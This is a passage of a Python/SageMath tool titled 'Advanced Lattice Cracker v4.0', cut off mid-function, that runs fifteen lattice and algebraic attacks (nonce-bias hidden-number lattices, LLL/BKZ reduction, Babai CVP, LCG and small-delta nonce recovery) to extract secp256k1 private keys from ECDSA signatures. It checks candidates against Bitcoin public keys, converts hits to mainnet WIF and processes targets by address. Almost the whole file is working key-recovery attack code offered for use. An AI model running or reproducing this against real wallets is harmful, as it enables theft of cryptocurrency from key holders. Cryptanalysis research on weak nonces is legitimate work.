"""
ADVANCED LATTICE CRACKER v4.0 — OPTIMIZED FOR 8GB RAM + ALL CORES
=================================================================
15 attacks. Fast. Memory-safe. Multiprocessing. No BKZ block > 20.

ATTACK ROSTER:
  PHASE 0 (Instant — No Lattice):
    1. GCD Small-Delta Detection
    2. LCG Phantom Recovery (quadratic equation)

  PHASE 1 (Fast — Tiny Lattice + LLL + Babai CVP):
    3. Babai HNP MSB
    4. Babai HNP LSB
    5. Monte Carlo Random Sampling
    6. Stochastic Lattice Annealing (SLA) [NOVEL]
    7. Signature Filtering + Tiny Lattice
    8. Dario Clavijo Polynonce (Differential)

  PHASE 2 (Standard HNP — Medium Lattice):
    9. Middle-Bit Window Leak
    10. Linear Nonce Bias
    11. Shared LSB (Fixed Suffix)
    12. Sequential Nonce

  PHASE 3 (Deep Reduction):
    13. Kannan Embedding (CVP→SVP)
    14. Progressive BKZ MSB/LSB (10→15→20)
    15. Greedy Round-Off CVP

REMOVED:
  - Multi-Leak Fusion: requires leak_type metadata that real-world
    signatures never contain. Useless outside test scenarios.
"""

import json
import os
import csv
import math
import gc
import sys
import time
import random as py_random
import shutil
import logging
import traceback
from multiprocessing import Pool, cpu_count, current_process
from threading import Timer, Thread
from sage.all import *

# ==============================================================================
# LOGGING
# ==============================================================================
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
_LOG_FILE = os.path.join(_SCRIPT_DIR, "ADVANCED_ERRORS.log")
logging.basicConfig(
    filename=_LOG_FILE,
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("AdvancedCracker")

# ==============================================================================
# SECP256K1 CONSTANTS
# ==============================================================================
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

Fp = GF(p)
E = EllipticCurve(Fp, [0, 7])
G = E(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

MAX_SIGS = 100         # Upper limit to allow Babai LLL its required 90+ geometric space
ATTACK_TIMEOUT = 120   # Max seconds per individual attack
N_HALF = N >> 1        # N // 2 for low-s normalization

# ==============================================================================
# CORE UTILITIES
# ==============================================================================
def normalize_s(sigs):
    """Enforce Bitcoin's low-s rule: if s > N/2, replace with N - s.
    Returns a new list — does not mutate the original."""
    out = []
    for sig in sigs:
        sig = dict(sig)  # shallow copy
        s_val = int(sig['s'], 16)
        if s_val > N_HALF:
            sig['s'] = hex(N - s_val)
        out.append(sig)
    return out


def validate_sigs(sigs):
    """Filter out signatures with missing or invalid r/s/z hex fields."""
    valid = []
    for sig in sigs:
        try:
            int(sig['r'], 16)
            int(sig['s'], 16)
            int(sig['z'], 16)
            valid.append(sig)
        except (KeyError, ValueError, TypeError):
            continue
    return valid


def verify_key(pub_hex, priv_int):
    priv_int = int(priv_int)
    if priv_int <= 0 or priv_int >= N:
        return False
    try:
        pt = priv_int * G
        x_bytes = int(pt[0]).to_bytes(32, 'big')
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            y_bytes = int(pt[1]).to_bytes(32, 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            prefix = b'\x02' if int(pt[1]) % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
        return generated_pub == pub_hex.lower()
    except Exception:
        return False


def min_sigs_lll(leaked_bits):
    """Generous geometry bounds required by weak LLL math (Babai)."""
    if leaked_bits >= 32: return 12
    if leaked_bits >= 16: return 24
    if leaked_bits >= 12: return 40
    if leaked_bits >= 8: return 68
    if leaked_bits >= 6: return 90
    if leaked_bits >= 4: return 140
    return 160

def min_sigs_bkz(leaked_bits):
    """Tight, strict bounds solely for BKZ block reduction to preserve speed."""
    if leaked_bits >= 32: return 12
    if leaked_bits >= 16: return 24
    if leaked_bits >= 12: return 32
    if leaked_bits >= 8: return 45
    if leaked_bits >= 6: return 59
    if leaked_bits >= 4: return 75
    return 80


def privkey_to_wif(priv_int, compressed=True):
    """Convert a private key integer to WIF format (mainnet)."""
    priv_int = int(priv_int)
    raw = b'\x80' + priv_int.to_bytes(32, 'big')
    if compressed:
        raw += b'\x01'
    import hashlib
    checksum = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
    payload = raw + checksum
    # Base58 encode
    B58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    n = int.from_bytes(payload, 'big')
    chars = []
    while n > 0:
        n, r = divmod(n, 58)
        chars.append(B58_CHARS[r])
    for b in payload:
        if b == 0:
            chars.append('1')
        else:
            break
    return ''.join(reversed(chars))


def precompute_uv(sigs):
    """Precompute (u, v) = (r*s_inv, z*s_inv) for each sig.
    Uses analyzer's pre-computed A/B if available."""
    uv = []
    for s in sigs:
        if 'A' in s and 'B' in s:
            # A = z*s_inv, B = r*s_inv  (pre-computed by analyzer)
            uv.append((int(s['B'], 16), int(s['A'], 16)))
        else:
            r = int(s['r'], 16)
            si = int(s['s'], 16)
            z = int(s['z'], 16)
            si_inv = int(inverse_mod(si, N))
            uv.append(((r * si_inv) % N, (z * si_inv) % N))
    return uv


def exact_div(n, d):
    """Infinitely precise Python integer division truncating towards zero."""
    n, d = int(n), int(d)
    return n // d if n * d >= 0 else -(abs(n) // abs(d))

def extract_key(M_r, key_col, scale, pub):
    for row in M_r:
        val = row[key_col]
        if val == 0:
            continue
        for sign in [1, -1]:
            cand = (sign * exact_div(val, scale)) % N
            if cand != 0 and verify_key(pub, cand):
                return cand
    return None


def extract_key_extended(M_r, key_col, scale, pub, search_range=30):
    for row in M_r:
        val = row[key_col]
        if val == 0:
            continue
        base = exact_div(val, scale)
        for offset in range(-search_range, search_range + 1):
            for sign in [1, -1]:
                cand = (sign * (base + offset)) % N
                if cand != 0 and verify_key(pub, cand):
                    return cand
    return None


class AttackTimeout(Exception):
    """Raised when an individual attack exceeds ATTACK_TIMEOUT seconds."""
    pass


def _timeout_handler():
    """Cross-platform timeout — sets a flag (checked by long-running loops)."""
    pass  # We use elapsed-time checks instead of signals for Windows compat


# ==============================================================================
# LATTICE BUILDERS
# ==============================================================================
def build_msb_lattice(sigs, leaked_bits):
    num = min(len(sigs), MAX_SIGS)
    sigs = sigs[:num]
    B = 2 ** (256 - leaked_bits)
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (r_i * s_inv) % N
        a_i = (z_i * s_inv - B // 2) % N
        M[i, i] = N * N
        M[num, i] = t_i * N
        M[num + 1, i] = a_i * N
    M[num, num] = B
    M[num + 1, num + 1] = B * N
    return M, B, num


def build_lsb_lattice(sigs, leaked_bits):
    num = min(len(sigs), MAX_SIGS)
    sigs = sigs[:num]
    shift = 2 ** leaked_bits
    B = 2 ** (256 - leaked_bits)
    shift_inv = int(inverse_mod(shift, N))
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (shift_inv * r_i * s_inv) % N
        a_i = (shift_inv * z_i * s_inv - B // 2) % N
        M[i, i] = N * N
        M[num, i] = t_i * N
        M[num + 1, i] = a_i * N
    M[num, num] = B
    M[num + 1, num + 1] = B * N
    return M, B, num


# ==============================================================================
# REDUCTION METHODS
# ==============================================================================
def progressive_reduce(M, max_block=30):
    """Progressive BKZ: LLL → BKZ-15 → BKZ-20 → BKZ-25 → BKZ-30."""
    M_r = M.LLL()
    nrows = M.nrows()
    for bs in [15, 20, 25, 30, min(max_block, nrows)]:
        if bs > nrows or bs < 2:
            continue
        try:
            M_r = M_r.BKZ(block_size=bs)
        except Exception:
            break
    return M_r


# ==============================================================================
# BABAI'S NEAREST PLANE (CVP SOLVER)
# ==============================================================================
def babai_cvp(lattice_basis, target_vector):
    """Babai's Nearest Plane CVP using original exact QQ field.
    Prevents floating-point precision loss and avoids SageMath inexact ring limitations."""
    B = Matrix(QQ, lattice_basis)
    G_mat, _ = B.gram_schmidt()
    n = B.nrows()
    b = vector(QQ, target_vector)
    for i in range(n - 1, -1, -1):
        gi = G_mat[i]
        denom = gi.dot_product(gi)
        if denom == 0:
            continue
        ci = round(b.dot_product(gi) / denom)
        b -= ci * B[i]
    closest = vector(ZZ, target_vector) - vector(ZZ, [round(x) for x in b])
    return closest


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 1: GCD SMALL-DELTA NONCE DETECTION
# ██████████████████████████████████████████████████████████████████████████████
def solve_gcd_nonce(pub, sigs, max_delta=500, precomputed_uv=None):
    n = len(sigs)
    if n < 2:
        return None
    uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)
    for i in range(min(n, 40)):
        for j in range(i + 1, min(i + 6, n)):
            du = (uv[j][0] - uv[i][0]) % N
            dv = (uv[j][1] - uv[i][1]) % N
            if du == 0:
                continue
            du_inv = int(inverse_mod(int(du), N))
            for delta in range(-max_delta, max_delta + 1):
                d_cand = int(((delta - dv) * du_inv) % N)
                if d_cand == 0 or d_cand >= N:
                    continue
                # FIX: Require at least 2/5 third-party sigs to be consistent
                consistent_count = 0
                check_count = 0
                for m in range(min(n, 20)):
                    if m == i or m == j:
                        continue
                    diff_m = (d_cand * (uv[m][0] - uv[i][0]) + (uv[m][1] - uv[i][1])) % N
                    if diff_m > N_HALF:
                        diff_m = N - diff_m
                    check_count += 1
                    if diff_m < max_delta * 10:
                        consistent_count += 1
                    if check_count >= 5:
                        break
                if consistent_count < 2:
                    continue
                if verify_key(pub, d_cand):
                    return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 2: LCG PHANTOM RECOVERY [NOVEL]
# ██████████████████████████████████████████████████████████████████████████████
def solve_lcg_phantom(pub, sigs, precomputed_uv=None):
    n = len(sigs)
    if n < 4:
        return None
    uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)
    for start in range(min(n - 3, 50)):
        u0, v0 = uv[start]
        u1, v1 = uv[start + 1]
        u2, v2 = uv[start + 2]
        u3, v3 = uv[start + 3]
        a0 = (u1 - u0) % N; b0 = (v1 - v0) % N
        a1 = (u2 - u1) % N; b1 = (v2 - v1) % N
        a2 = (u3 - u2) % N; b2 = (v3 - v2) % N
        A_c = (a1 * a1 - a0 * a2) % N
        B_c = (2 * a1 * b1 - a0 * b2 - a2 * b0) % N
        C_c = (b1 * b1 - b0 * b2) % N
        if A_c == 0:
            if B_c == 0:
                continue
            try:
                d_cand = int((-C_c * inverse_mod(int(B_c), N)) % N)
            except Exception:
                continue
            if d_cand != 0 and verify_key(pub, d_cand):
                return d_cand
            continue
        disc = (B_c * B_c - 4 * A_c * C_c) % N
        try:
            sqrt_disc = int(Mod(disc, N).sqrt())
        except Exception:
            continue
        # FIX: Guard against (2*A_c) % N == 0
        two_A = (2 * A_c) % N
        if two_A == 0:
            continue
        try:
            inv_2A = int(inverse_mod(int(two_A), N))
        except Exception:
            continue
        for sign in [1, -1]:
            d_cand = int(((-B_c + sign * sqrt_disc) * inv_2A) % N)
            if d_cand != 0 and verify_key(pub, d_cand):
                return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 3 & 4: BABAI HNP (MSB + LSB)
# ██████████████████████████████████████████████████████████████████████████████
def solve_babai_msb(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    # PRIMARY: Proven N*N lattice construction + standard LLL extraction
    M, B_scale, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B_scale, pub)
    if d:
        return d
    del M, M_r  # Free first lattice before building second
    # BONUS: Babai CVP on simple lattice
    num = len(sigs)
    dim = num + 1
    L = Matrix(ZZ, dim, dim)
    t_vals = []
    a_vals = []
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_vals.append((r_i * s_inv) % N)
        a_vals.append((z_i * s_inv) % N)
        L[i, i] = N * N
    for i in range(num):
        L[num, i] = t_vals[i] * N
    B = 2 ** (256 - leaked_bits)
    L[num, num] = B
    L_r = L.LLL()
    target = vector(ZZ, [int(B // 2 - a) * N for a in a_vals] + [0])
    closest = babai_cvp(L_r, target)
    d_cand = exact_div(closest[num], B) % N
    if d_cand != 0 and verify_key(pub, d_cand):
        return d_cand
    d_cand = (-d_cand) % N
    if d_cand != 0 and verify_key(pub, d_cand):
        return d_cand
    return None


def solve_babai_lsb(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    # PRIMARY: Proven N*N lattice construction + standard LLL extraction
    M, B_scale, key_col = build_lsb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B_scale, pub)
    if d:
        return d
    del M, M_r  # Free first lattice before building second
    # BONUS: Babai CVP on simple lattice
    num = len(sigs)
    shift = 2 ** leaked_bits
    shift_inv = int(inverse_mod(shift, N))
    dim = num + 1
    L = Matrix(ZZ, dim, dim)
    t_vals = []
    a_vals = []
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_vals.append((shift_inv * r_i * s_inv) % N)
        a_vals.append((shift_inv * z_i * s_inv) % N)
        L[i, i] = N * N
    for i in range(num):
        L[num, i] = t_vals[i] * N
    B = 2 ** (256 - leaked_bits)
    L[num, num] = B
    L_r = L.LLL()
    target = vector(ZZ, [int(B // 2 - a) * N for a in a_vals] + [0])
    closest = babai_cvp(L_r, target)
    d_cand = exact_div(closest[num], B) % N
    if d_cand != 0 and verify_key(pub, d_cand):
        return d_cand
    d_cand = (-d_cand) % N
    if d_cand != 0 and verify_key(pub, d_cand):
        return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 8: DARIO CLAVIJO DIFFERENTIAL POLYNONCE
# ██████████████████████████████████████████████████████████████████████████████
def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
    sigs = sigs[:MAX_SIGS]
    msgs = [int(s['z'], 16) for s in sigs]
    sig_pairs = [(int(s['r'], 16), int(s['s'], 16)) for s in sigs]
    m = len(msgs)
    msgn, rn, sn = msgs[-1], sig_pairs[-1][0], sig_pairs[-1][1]
    rnsn_inv = (rn * int(inverse_mod(sn, N))) % N
    mnsn_inv = (msgn * int(inverse_mod(sn, N))) % N
    matrix = Matrix(ZZ, m + 2, m + 2)
    for i in range(m):
        matrix[i, i] = N * N
    for i in range(m):
        si_inv = int(inverse_mod(sig_pairs[i][1], N))
        x0 = ((sig_pairs[i][0] * si_inv) - rnsn_inv) % N
        x1 = ((msgs[i] * si_inv) - mnsn_inv) % N
        matrix[m, i] = x0 * N
        matrix[m + 1, i] = x1 * N
    B_val = int(2**B_bits)
    matrix[m, m] = B_val
    matrix[m + 1, m + 1] = B_val * N
    if use_bkz:
        new_matrix = matrix.LLL()
        new_matrix = new_matrix.BKZ(block_size=min(20, m))
    else:
        new_matrix = matrix.LLL(delta=0.99, early_red=True, use_siegel=True)
    for row in new_matrix:
        val = row[m]
        if val == 0:
            continue
        possible_d = exact_div(val, B_val) % N
        if possible_d != 0 and verify_key(pub, possible_d):
            return possible_d
        neg_d = (-possible_d) % N
        if neg_d != 0 and verify_key(pub, neg_d):
            return neg_d
        # FIX: differential extraction with proper modular arithmetic
        diff_val = row[0]
        if diff_val == 0:
            continue
        for sign_v in (1, -1):
            potential_nonce_diff = sign_v * exact_div(diff_val, N)
            # numerator = s_n * z_0 - s_0 * z_n - s_0 * s_n * nonce_diff
            numerator = ((sn * msgs[0]) % N - (sig_pairs[0][1] * msgn) % N
                         - (sig_pairs[0][1] * sn % N * potential_nonce_diff) % N) % N
            # denominator = r_n * s_0 - r_0 * s_n
            denominator = ((rn * sig_pairs[0][1]) % N - (sig_pairs[0][0] * sn) % N) % N
            if denominator == 0:
                continue
            try:
                denom_inv = int(inverse_mod(int(denominator), N))
                key = (numerator * denom_inv) % N
                if key != 0 and verify_key(pub, key):
                    return key
            except Exception:
                pass
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 5: MONTE CARLO RANDOM SAMPLING
# ██████████████████████████████████████████████████████████████████████████████
def solve_monte_carlo(pub, sigs, leaked_bits, num_trials=80, sample_size=15, time_budget=30):
    """Monte Carlo with time budget — stops early if time_budget seconds exceeded."""
    if len(sigs) < sample_size:
        sample_size = len(sigs)
    t0 = time.time()
    for trial in range(num_trials):
        if time.time() - t0 > time_budget:
            break
        subset = py_random.sample(sigs, sample_size)
        M, B, key_col = build_msb_lattice(subset, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d:
            return d
    for trial in range(num_trials // 2):
        if time.time() - t0 > time_budget:
            break
        subset = py_random.sample(sigs, sample_size)
        M, B, key_col = build_lsb_lattice(subset, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d:
            return d
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 6: STOCHASTIC LATTICE ANNEALING (SLA) [NOVEL]
# ██████████████████████████████████████████████████████████████████████████████
def solve_sla(pub, sigs, leaked_bits, iterations=60, sample_size=15, time_budget=30):
    """SLA with time budget — stops early if time_budget seconds exceeded."""
    n = len(sigs)
    if n < sample_size:
        sample_size = n
    temperature = 1.0
    cooling = 0.97
    indices = py_random.sample(range(n), sample_size)
    best_score = float('inf')
    best_indices = indices[:]
    t0 = time.time()

    for iteration in range(iterations):
        if time.time() - t0 > time_budget:
            break
        subset = [sigs[i] for i in indices]
        # Evaluate both MSB and LSB structures in tandem
        M_msb, B, key_col = build_msb_lattice(subset, leaked_bits)
        M_lsb, _, _ = build_lsb_lattice(subset, leaked_bits)
        M_msb_r = M_msb.LLL()
        M_lsb_r = M_lsb.LLL()
        d1 = extract_key(M_msb_r, key_col, B, pub)
        if d1: return d1
        d2 = extract_key(M_lsb_r, key_col, B, pub)
        if d2: return d2

        # Score the lattice by the length of its shortest vector containing the key
        score_msb = score_lsb = float('inf')
        for row in M_msb_r:
            if row[key_col] != 0:
                score_msb = float(row.norm())
                break
        for row in M_lsb_r:
            if row[key_col] != 0:
                score_lsb = float(row.norm())
                break
        score = min(score_msb, score_lsb)
        if score < best_score:
            best_score = score
            best_indices = indices[:]
        new_indices = indices[:]
        available = [i for i in range(n) if i not in new_indices]
        if not available:
            break
        num_swaps = min(py_random.randint(1, 2), len(available))
        for _ in range(num_swaps):
            if not available:
                break
            pos = py_random.randint(0, len(new_indices) - 1)
            new_idx = py_random.choice(available)
            old_idx = new_indices[pos]
            available.remove(new_idx)
            available.append(old_idx)
            new_indices[pos] = new_idx
        if score <= best_score or py_random.random() < math.exp(-1.0 / (temperature + 1e-10)):
            indices = new_indices
        temperature *= cooling

    # Final attempt on best
    subset = [sigs[i] for i in best_indices]
    M, B, key_col = build_msb_lattice(subset, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B, pub)
    if d:
        return d
    del M, M_r  # Free first lattice before building second
    M, B, key_col = build_lsb_lattice(subset, leaked_bits)
    M_r = M.LLL()
    return extract_key(M_r, key_col, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 7: SIGNATURE FILTERING + TINY LATTICE
# ██████████████████████████████████████████████████████████████████████████████
def solve_filtered_lattice(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 5:
        return None
    scored = []
    for idx, sig in enumerate(sigs):
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        s_inv = int(inverse_mod(s, N))
        t = (r * s_inv) % N
        score = 0
        r_bits = int(r).bit_length()
        if r_bits < 248:
            score += (256 - r_bits) * 3
        if r_bits < 240:
            score += 50
        r_hex = hex(r)[2:].zfill(64)
        leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
        score += leading_zeros * 10
        s_bits = int(s).bit_length()
        if s_bits < 240:
            score += (256 - s_bits) * 2
        if t < N // 256 or t > N - N // 256:
            score += 30
        scored.append((score, idx))
    scored.sort(reverse=True)
    for k in [10, 15, 20]:
        if k > num:
            break
        top_sigs = [sigs[scored[i][1]] for i in range(k)]
        M, B, key_col = build_msb_lattice(top_sigs, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d:
            return d
        M, B, key_col = build_lsb_lattice(top_sigs, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d:
            return d
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 9: MIDDLE-BIT WINDOW LEAK
# ██████████████████████████████████████████████████████████████████████████████
def solve_middle_bits(pub, sigs, window_bits, start_bit, progressive=False):
    num = min(len(sigs), 40)  # Capped at 40 since bivariate lattice doubles dimension to ~82
    sigs = sigs[:num]
    L_val = 2 ** start_bit
    H_val = 2 ** (256 - start_bit - window_bits)
    S_val = 2 ** (start_bit + window_bits)
    dim = 2 * num + 2
    M = Matrix(ZZ, dim, dim)
    W_v = N * H_val
    W_high = L_val * N
    W_x = L_val * H_val
    W_c = L_val * N * H_val
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (r_i * s_inv) % N
        a_i = (z_i * s_inv) % N
        M[i, i] = N * W_v
        M[num + i, i] = (-S_val % N) * W_v
        M[num + i, num + i] = W_high
        M[2 * num, i] = t_i * W_v
        M[2 * num + 1, i] = ((a_i - L_val // 2) % N) * W_v
    M[2 * num, 2 * num] = W_x
    M[2 * num + 1, 2 * num + 1] = W_c
    M_r = progressive_reduce(M) if progressive else M.LLL()
    for row in M_r:
        val = row[2 * num]
        if val == 0:
            continue
        for sign in [1, -1]:
            cand = (sign * exact_div(val, W_x)) % N
            if cand != 0 and verify_key(pub, cand):
                return cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 10: LINEAR NONCE BIAS
# ██████████████████████████████████████████████████████████████████████████████
def solve_linear_nonce(pub, sigs, bias_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    B = 2 ** bias_bits
    dim = num + 3
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        M[i, i] = N
        M[num, i] = (s_i * z_i) % N
        M[num + 1, i] = s_i % N
        M[num + 2, i] = (-r_i) % N
    M[num, num] = B
    M[num + 1, num + 1] = B
    M[num + 2, num + 2] = B
    M_r = progressive_reduce(M) if progressive else M.LLL()
    for row in M_r:
        for col in [num, num + 1, num + 2]:
            val = row[col]
            if val == 0:
                continue
            for sign in [1, -1]:
                cand = (sign * exact_div(val, B)) % N
                if cand != 0 and verify_key(pub, cand):
                    return cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 11: SHARED LSB NONCE (FIXED SUFFIX)
# ██████████████████████████████████████████████████████████████████████████████
def solve_shared_lsb(pub, sigs, shared_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 3:
        return None
    r0 = int(sigs[0]['r'], 16)
    s0 = int(sigs[0]['s'], 16)
    z0 = int(sigs[0]['z'], 16)
    s0_inv = int(inverse_mod(s0, N))
    m = num - 1
    B = 2 ** (256 - shared_bits)
    shift_inv = int(inverse_mod(2 ** shared_bits, N))
    dim = m + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(m):
        ri = int(sigs[i + 1]['r'], 16)
        si = int(sigs[i + 1]['s'], 16)
        zi = int(sigs[i + 1]['z'], 16)
        si_inv = int(inverse_mod(si, N))
        t_i = (((ri * si_inv) - (r0 * s0_inv)) * shift_inv) % N
        a_i = ((((zi * si_inv) - (z0 * s0_inv)) * shift_inv) - B // 2) % N
        M[i, i] = N * N
        M[m, i] = t_i * N
        M[m + 1, i] = a_i * N
    M[m, m] = B
    M[m + 1, m + 1] = B * N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, m, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 12: SEQUENTIAL NONCE (WINDOWED)
# ██████████████████████████████████████████████████████████████████████████████
def solve_sequential_nonce(pub, sigs, err_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 4:
        return None
    r0 = int(sigs[0]['r'], 16)
    s0 = int(sigs[0]['s'], 16)
    z0 = int(sigs[0]['z'], 16)
    s0_inv = int(inverse_mod(s0, N))
    m = num - 1
    B = 2 ** (err_bits + 1)
    dim = m + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(m):
        ri = int(sigs[i + 1]['r'], 16)
        si = int(sigs[i + 1]['s'], 16)
        zi = int(sigs[i + 1]['z'], 16)
        si_inv = int(inverse_mod(si, N))
        t_i = ((ri * si_inv) - (r0 * s0_inv)) % N
        a_i = (((zi * si_inv) - (z0 * s0_inv)) - B // 2) % N
        M[i, i] = N * N
        M[m, i] = t_i * N
        M[m + 1, i] = a_i * N
    M[m, m] = B
    M[m + 1, m + 1] = B * N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, m, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 13: KANNAN EMBEDDING (CVP → SVP)
# ██████████████████████████████████████████████████████████████████████████████
def solve_kannan_embedding(pub, sigs, leaked_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    M, B, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, key_col, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 14 & 15: PROGRESSIVE REDUCED BKZ MSB/LSB
# ██████████████████████████████████████████████████████████████████████████████
def build_reduced_lattice(sigs, leaked_bits, root_idx=0, is_lsb=False):
    num = len(sigs)
    B = 2 ** (256 - leaked_bits)
    if is_lsb:
        shift_inv = int(inverse_mod(2 ** leaked_bits, N))
    else:
        shift_inv = 1
    root_sig = sigs[root_idx]
    r_root = int(root_sig['r'], 16)
    s_root = int(root_sig['s'], 16)
    z_root = int(root_sig['z'], 16)
    r_root_inv = int(inverse_mod(r_root, N))
    dim = num + 1
    M = Matrix(ZZ, dim, dim)
    row_idx = 0
    for i in range(num):
        if i == root_idx:
            continue
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_prime = (s_inv * r_i * s_root * r_root_inv) % N
        a_prime = (s_inv * (z_i - r_i * z_root * r_root_inv)) % N
        if is_lsb:
            a_prime = (a_prime * shift_inv) % N
        a_centered = (a_prime + t_prime * (B // 2) - B // 2) % N
        M[row_idx, row_idx] = N
        M[dim - 2, row_idx] = t_prime
        M[dim - 1, row_idx] = a_centered
        row_idx += 1
    M[dim - 2, dim - 2] = 1
    M[dim - 1, dim - 1] = B
    return M, B

def extract_reduced_key(M_r, B, root_sig, is_lsb, leaked_bits, pub):
    for row in M_r:
        val = row[M_r.ncols() - 2]
        if val == 0:
            continue
        for sign in [1, -1]:
            k_prime_root = sign * int(val)
            k_root_derived = (k_prime_root + B // 2) % N
            if is_lsb:
                k_true = (k_root_derived * (2 ** leaked_bits)) % N
            else:
                k_true = k_root_derived
            r_root = int(root_sig['r'], 16)
            s_root = int(root_sig['s'], 16)
            z_root = int(root_sig['z'], 16)
            x_cand = ((k_true * s_root - z_root) * int(inverse_mod(r_root, N))) % N
            if x_cand != 0 and verify_key(pub, x_cand):
                return x_cand
    return None

def solve_progressive_reduced(pub, sigs, leaked_bits, is_lsb):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    for root_idx in range(min(5, num)):
        M, B = build_reduced_lattice(sigs, leaked_bits, root_idx, is_lsb)
        M_r = progressive_reduce(M)
        d = extract_reduced_key(M_r, B, sigs[root_idx], is_lsb, leaked_bits, pub)
        if d:
            return d
    return None

def solve_progressive_msb(pub, sigs, leaked_bits):
    return solve_progressive_reduced(pub, sigs, leaked_bits, False)

def solve_progressive_lsb(pub, sigs, leaked_bits):
    return solve_progressive_reduced(pub, sigs, leaked_bits, True)


# ==============================================================================
# TIMED ATTACK WRAPPER
# ==============================================================================
def run_attack(name, func, *args, timeout=ATTACK_TIMEOUT):
    """Run a single attack with timing and error handling.
    Returns (result, elapsed_seconds, error_msg_or_None)."""
    t0 = time.time()
    try:
        result = func(*args)
        elapsed = time.time() - t0
        return result, elapsed, None
    except Exception as e:
        elapsed = time.time() - t0
        err_msg = f"{name}: {type(e).__name__}: {e}"
        logger.warning(err_msg)
        return None, elapsed, err_msg


# ==============================================================================
# PER-TARGET WORKER — runs all 15 attacks on one target
# ==============================================================================
def process_target(tgt):
    """Worker function: runs all 15 attacks on a single target dict.
    Returns a dict with results, or None if nothing found."""
    address = tgt.get('address', 'Unknown')
    pub = tgt.get('pubkey', 'Unknown')
    sigs = list(tgt.get('signatures', []))
    
    # Filter out malformed signatures BEFORE doing anything else
    sigs = validate_sigs(sigs)
    
    if len(sigs) < 4:
        return None

    # Cap sigs for memory safety
